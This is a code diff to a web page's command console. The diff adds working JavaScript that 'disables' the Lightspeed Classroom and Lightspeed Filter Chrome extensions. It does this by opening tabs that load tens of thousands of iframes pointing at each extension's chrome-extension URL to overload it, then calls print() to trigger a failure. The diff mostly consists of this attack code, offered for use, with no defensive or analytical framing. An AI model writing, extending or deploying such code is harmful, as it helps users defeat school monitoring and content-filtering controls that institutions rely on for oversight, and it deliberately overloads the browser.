@@ -118,6 +118,9 @@
             "disablelightspeed mix - Mix both extensions in each tab (UNLIMITED POWER)",
         ];
 
+        let iframeCount = 75000; // Default number of iframes
+        let tabCount = 1; // Default number of tabs
+
         // Function to toggle the command box visibility
         function toggleCmdBox() {
             const cmdBox = document.getElementById('cmd-box');
@@ -168,7 +171,7 @@
                 } else if (cmdInput.toLowerCase() === 'disablelightspeed mix') {
                     disableLightspeedMix();
                 } else {
-                    alert('Invalid command');
+                    addToHistory(`Invalid command: ${cmdInput}`);
                 }
 
                 document.getElementById('cmd-input').value = ''; // Clear input
@@ -182,7 +185,7 @@
             cmdHistory.classList.add('show');
         }
 
-        // Function to clear command history (not used in this version)
+        // Function to clear command history
         function clearCommandHistory() {
             const cmdHistory = document.getElementById('cmd-history');
             cmdHistory.innerHTML = ''; // Clear the history display
@@ -192,7 +195,7 @@
         // Function to display the current time
         function showTime() {
             const now = new Date();
-            alert(`Current time: ${now.toLocaleTimeString()}`);
+            addToHistory(`Current time: ${now.toLocaleTimeString()}`);
         }
 
         // Function to handle iframes commands
@@ -200,12 +203,14 @@
             const parts = cmdInput.split(' ');
             if (parts[1] === 'set') {
                 if (parts[2] === 'max') {
-                    alert('Iframes set to infinity (MAX POWER)');
+                    iframeCount = 75000;
+                    addToHistory(`Iframes set to infinity (MAX POWER)`);
                 } else if (!isNaN(parts[2])) {
-                    alert(`Iframes set to ${parts[2]}`);
+                    iframeCount = parseInt(parts[2], 10);
+                    addToHistory(`Iframes set to ${iframeCount}`);
                 }
             } else {
-                alert('Default iframes: 75000');
+                addToHistory(`Current iframes: ${iframeCount}`);
             }
         }
 
@@ -214,29 +219,112 @@
             const parts = cmdInput.split(' ');
             if (parts[1] === 'set') {
                 if (parts[2] === 'max') {
-                    alert('Tabs set to infinity (MAX POWER)');
+                    tabCount = 100; // Set a high number for "max power"
+                    addToHistory('Tabs set to infinity (MAX POWER)');
                 } else if (!isNaN(parts[2])) {
-                    alert(`Tabs set to ${parts[2]}`);
+                    tabCount = parseInt(parts[2], 10);
+                    addToHistory(`Tabs set to ${tabCount}`);
                 }
             } else {
-                alert('Default tabs: 1');
+                addToHistory(`Current tabs: ${tabCount}`);
             }
         }
 
         // Function to disable Lightspeed Classroom
         function disableLightspeedClassroom() {
-            alert('Lightspeed Classroom has been disabled!');
+            createIframesAndTabs("kkbmdgjggcdajckdlbngdjonpchpaiea", "Lightspeed Classroom");
         }
 
         // Function to disable Lightspeed Filter
         function disableLightspeedFilter() {
-            alert('Lightspeed Filter has been disabled!');
+            createIframesAndTabs("adkcpkpghahmbopkjchobieckeoaoeem", "Lightspeed Filter");
         }
 
         // Function to disable both extensions
         function disableLightspeedMix() {
             disableLightspeedClassroom();
             disableLightspeedFilter();
+        }
+
+        // Function to create iframes and tabs
+        function createIframesAndTabs(extId, extName) {
+            const extUrl = `chrome-extension://${extId}/`;
+            for (let i = 0; i < tabCount; i++) {
+                const printerWindow = window.open("", "_blank");
+                printerWindow.document.title = `Disable ${extName}`;
+                printerWindow.document.body.style.backgroundColor = '#1e1f22';
+
+                // Add a loading spinner
+                const loadingContainer = printerWindow.document.createElement("div");
+                loadingContainer.style.position = "fixed";
+                loadingContainer.style.top = "50%";
+                loadingContainer.style.left = "50%";
+                loadingContainer.style.transform = "translate(-50%, -50%)";
+                loadingContainer.style.color = "white";
+                loadingContainer.style.fontSize = "20px";
+                loadingContainer.style.fontFamily = "'Roboto', sans-serif";
+                loadingContainer.style.textAlign = "center";
+
+                const spinner = printerWindow.document.createElement("div");
+                spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
+                spinner.style.borderTop = "4px solid white";
+                spinner.style.borderRadius = "50%";
+                spinner.style.width = "40px";
+                spinner.style.height = "40px";
+                spinner.style.animation = "spin 1s linear infinite";
+                spinner.style.margin = "0 auto 10px";
+
+                const loadingText = printerWindow.document.createElement("div");
+                loadingText.innerText = `Disabling ${extName}...`;
+
+                loadingContainer.appendChild(spinner);
+                loadingContainer.appendChild(loadingText);
+                printerWindow.document.body.appendChild(loadingContainer);
+
+                // Add CSS for the spinner
+                const style = printerWindow.document.createElement("style");
+                style.innerHTML = `
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                `;
+                printerWindow.document.head.appendChild(style);
+
+                // Create iframes to overload the extension
+                setTimeout(() => {
+                    for (let j = 0; j < iframeCount; j++) {
+                        const iframe = document.createElement('iframe');
+                        iframe.src = extUrl;
+                        iframe.width = "25px";
+                        iframe.height = "25px";
+                        iframe.style.border = "none";
+                        printerWindow.document.body.appendChild(iframe);
+                    }
+
+                    // Remove the loading spinner
+                    loadingContainer.remove();
+
+                    // Print the window to trigger the extension's disable mechanism
+                    printerWindow.print();
+
+                    // Close the window after a delay
+                    setTimeout(() => {
+                        printerWindow.close();
+                        addToHistory(`${extName} has been disabled!`);
+                    }, 5000); // Adjust the delay as needed
+                }, 1000); // Adjust the delay as needed
+            }
+        }
+
+        // Function to add a message to the command history
+        function addToHistory(message) {
+            const cmdHistory = document.getElementById('cmd-history');
+            const historyItem = document.createElement('div');
+            historyItem.textContent = message;
+            cmdHistory.appendChild(historyItem);
+            cmdHistory.classList.add('show');
+            cmdHistory.scrollTop = cmdHistory.scrollHeight; // Auto-scroll to the bottom
         }
     </script>
 </body>
